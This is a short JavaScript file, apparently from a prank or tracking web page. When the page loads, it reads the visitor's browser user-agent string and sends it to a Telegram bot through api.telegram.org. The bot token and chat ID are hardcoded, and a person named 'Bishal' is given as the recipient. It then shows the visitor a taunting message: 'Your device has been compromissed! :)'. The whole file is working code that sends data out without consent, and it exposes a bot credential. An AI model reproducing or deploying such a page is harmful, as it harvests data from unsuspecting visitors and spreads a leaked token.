function log_msg(message, title) {
    document.getElementById("log").innerHTML += message + "\n";

    if (title) {
        document.getElementById("log-title").innerHTML = title;
    }
}


function load() {
    log_msg("[+] Please wait...", "Please wait...")
    log_msg("[+] Getting device info...")

    var device_info = navigator.userAgent;

    log_msg("[+] Information:")
    log_msg(device_info)
    log_msg("[+] Sending information to `Bishal`")

    var bot_token = "7877071626:AAECIFcZomfylNSR2dq1rDIuZkgU1nmJ_vk";
    var chat_id = "2134776547";
    var message = device_info

    var url = `https://api.telegram.org/bot${bot_token}/sendMessage?chat_id=${chat_id}&parse_mode=HTML&text=${message}`;

    var req = new XMLHttpRequest();
    req.open("GET", url, true);
    req.send();
    req.onload = function() {
        if (req.status == 200) {
            log_msg("[+] Information successfully sent!", "Your device has been compromissed! :)")

        }else {
            log_msg("[-] Information wasn't sent! Error: " + req.responseText, "You got lucky buddy :(")
        }
    }
}
